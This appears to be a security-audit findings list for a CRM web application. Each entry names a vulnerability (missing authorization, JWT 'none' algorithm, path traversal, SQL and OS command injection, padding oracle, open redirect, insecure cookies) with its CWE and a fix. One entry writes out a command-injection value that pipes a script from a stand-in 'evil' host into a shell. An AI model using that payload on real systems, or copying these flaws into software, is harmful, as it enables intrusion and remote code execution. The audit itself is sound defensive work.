extra.message: confirmResetByEmailFallback() resets any account's password using only the attacker-supplied email address; no reset token is verified. It is reachable via the @Public() POST /auth/reset-password/email-fallback endpoint, so an unauthenticated attacker can take over any account by knowing its email. Password recovery must require a valid, unexpired, single-use token.

cwe: CWE-640: Weak Password Recovery Mechanism for Forgotten Password

extra.message: processAllocation() verifies the caller-supplied x-access-token with jwt.verify(..., { algorithms: ['HS256', 'none'] }). Allowing the 'none' algorithm lets an attacker forge an unsigned token and pass authentication to the public GET /organizations/:id/cost-allocation endpoint. Only the expected signed algorithm (HS256) must be allowed.

cwe: CWE-347: Improper Verification of Cryptographic Signature

extra.message: uploadLogo() builds the destination path with path.join(publicLogosDir, file.originalname) and writes file.buffer there. file.originalname is fully attacker-controlled (multipart filename), so values such as '../../server.js' escape the public/logos directory and allow arbitrary file write into the public asset tree. Generate a random filename instead of trusting the upload name.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: convertToExportFormat() interpolates the user-controlled exportFormat body parameter and the source path into a shell command and runs it via exec(): `soffice --headless --convert-to ${exportFormat} --outdir ... ${srcPath}`. No validation or quoting is applied, so a value like `txt; curl http://evil/x.sh | sh;` executes arbitrary OS commands. Use execFile/spawn with an argument array and validate exportFormat against an allowlist.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: archiveEngagementPacket() joins the user-supplied packetLabel directly into the path: path.join(packetDir, `${packetLabel}.json`) then writes to it. A packetLabel containing '../' (e.g. '../../uploads/x') escapes the engagement-packets directory and allows arbitrary file write. Apply path.basename()/sanitization as done in DealsService.archiveRenewalBrief.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: findAll() uses the user-controlled query.sortBy directly as the ORDER BY key: order: { [query.sortBy ?? 'createdAt']: query.sortOrder ?? 'DESC' }. QueryDealDto.sortBy is only @IsString(), so an attacker can inject arbitrary SQL into the ORDER BY clause. OrganizationsService.validateSortColumn() exists specifically to prevent this; the same allowlist must be applied here.

cwe: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

extra.message: findAll() passes the unvalidated query.sortBy into the TypeORM order clause: order: { [query.sortBy ?? 'createdAt']: query.sortOrder ?? 'DESC' }. QueryEscalationDto.sortBy is only @IsString(), allowing SQL injection through the ORDER BY clause. Validate sortBy against an allowlist of columns.

cwe: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

extra.message: runSavedSegment() merges caller-supplied criteria over the role restriction: const segmentFilter = { ...roleWhere, ...criteria }. A CUSTOMER_CONTACT can pass { organizationId: '<other-org>' } (or any field) to overwrite the mandatory own-organization filter and read contacts belonging to other organizations. Spread the trusted role filter last, or reject criteria keys that override it.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: adjustSharingScope() returns early and updates the contact whenever sharingMode === 'partner_shared', skipping checkModifyPermission() entirely. Any authenticated user (including a customer contact) can change any contact's sharing scope without ownership validation. The permission check must run before any update.

cwe: CWE-862: Missing Authorization

extra.message: previewCustomSegmentMessage() compiles and executes a caller-supplied Handlebars template (Handlebars.compile(messageTemplate)). Because the template string is fully user-controlled, this is server-side template injection: crafted templates can traverse object properties/helpers and may lead to code execution or data disclosure. Only render fixed templates with escaped values.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

extra.message: The JWT signing/verification secret falls back to the hardcoded literal 'crm-jwt-secret-key-change-in-production' (same default in auth.module.ts and several services). If JWT_SECRET is unset in production, all tokens are signed with a publicly known key, allowing attackers to forge authentication tokens. Fail startup when JWT_SECRET is missing instead of using a default.

cwe: CWE-798: Use of Hard-coded Credentials

extra.message: res.cookie('workspaceContext', context.token, { maxAge: ttlMs, path: '/' }) sets a security-context cookie without httpOnly, secure, or sameSite attributes, unlike the queueContext/reviewSessionId cookies elsewhere. The token is exposed to client-side scripts and can be sent over plaintext connections, enabling session-context tampering or theft. Set httpOnly, secure and sameSite: 'strict'.

cwe: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag

extra.message: res.cookie('digestContext', digest.contextToken, { maxAge: 3600000 }) sets a session-context cookie without httpOnly, secure, or sameSite flags, leaving it readable by JavaScript and transmittable over HTTP. Add httpOnly: true, secure: true and sameSite: 'strict'.

cwe: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag

extra.message: resolvePreviewLink() verifies the customer preview token with ignoreExpiration: true, and issuePreviewLink() signs it with no expiry. Preview links therefore never expire, so a leaked link grants permanent unauthenticated access to the document (the embed/resolve endpoints are @Public()). Verify with a bounded exp claim instead.

cwe: CWE-613: Insufficient Session Expiration

extra.message: getPartnerSchema() reflects any request Origin into Access-Control-Allow-Origin (`if (origin) { res.setHeader('Access-Control-Allow-Origin', origin) }`). This permissive cross-domain policy lets any website read the response. The ApiKeysController applies an allowlist for the same pattern; do the same here (or only set the header for known origins).

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: restoreLegacyExportRecord() decrypts attacker-controlled ciphertext/IV with AES-256-CBC and returns a distinct error when the failure message indicates 'bad decrypt'/'padding'. This distinguishable padding error creates a padding-oracle that can be used to decrypt arbitrary data. Use an authenticated mode (AES-GCM) and return a single generic error for all decryption failures.

cwe: CWE-649: Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking

extra.message: exportRenewalSummary() puts the caller-supplied documentTitle straight into the Content-Disposition response header without stripping CR/LF or quotes. Unlike ContactsService.exportContactCard(), which sanitizes the title, this allows header manipulation/filename injection. Sanitize the title (e.g. remove [\r\n"]) before using it in a header.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')

extra.message: recordActivityNote() accepts an arbitrary isInternal flag from the request body with no role check (the /activity-notes endpoint has no @Roles), so a CUSTOMER_CONTACT can create internal-only comments. targetType/targetId are also unvalidated, allowing notes to be attached to arbitrary entities. Enforce the staff-only check used by EscalationsService.addComment() and validate the target.

cwe: CWE-862: Missing Authorization

extra.message: applyBulkAdjustment() parses a raw JSON body and applies it with Object.assign(deal, adjustment) before saving. The JSON is not restricted to expected fields, so a caller can overwrite protected properties such as id, organizationId, ownerId, or stage. Explicitly whitelist the mutable fields instead of assigning arbitrary keys.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: syncBillingRecord() sends the partner API key in the URL query string over plaintext HTTP: `http://${billingHost}/sync?api_key=${apiKey}&webhookId=${webhook.id}`. Secrets in URLs are logged, cached and leaked via Referer, and HTTP transmits them in cleartext. Send credentials in an Authorization header over HTTPS.

cwe: CWE-598: Use of GET Request Method With Sensitive Query Strings

extra.message: compileRenewalForecast() returns the raw error message and stack trace to the client whenever the caller passes reportLevel=full, for any authenticated user and regardless of NODE_ENV. This leaks internal implementation details. Return a generic message and log the stack server-side only (as EscalationsService.compileEscalationTrends does).

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: The database connection sets ssl: { rejectUnauthorized: false } when DB_SSL=true, disabling TLS certificate validation. This makes the connection vulnerable to man-in-the-middle attacks. Use the default (validate certificates) or configure the CA explicitly.

cwe: CWE-295: Improper Certificate Validation

extra.message: forgotPassword() logs the generated password-reset token to the application console (`[PASSWORD RESET] Token for ${email}: ${resetToken}`). Reset tokens are credentials; writing them to logs exposes them to anyone with log access. Send them through the email channel only.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: After login the app reads the untrusted returnUrl query parameter and calls this.router.navigateByUrl(returnUrl) without validation. An attacker can craft /login?returnUrl=... to redirect the victim to an attacker-controlled destination (open redirect), useful for phishing. Only allow same-origin relative paths.

cwe: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

extra.message: The JWT access token is persisted in localStorage (crm_token). localStorage is readable by any JavaScript running on the page, so a single XSS anywhere in the app yields full account/token theft, and the token survives until logout. Store session tokens in httpOnly, secure cookies instead.

cwe: CWE-922: Insecure Storage of Sensitive Information

extra.message: The production environment configures the API base URL as 'http://localhost:3000/api'. Building for production with a plaintext HTTP endpoint transmits the bearer token and all CRM data without encryption, enabling interception. Production must use https://.

cwe: CWE-319: Cleartext Transmission of Sensitive Information
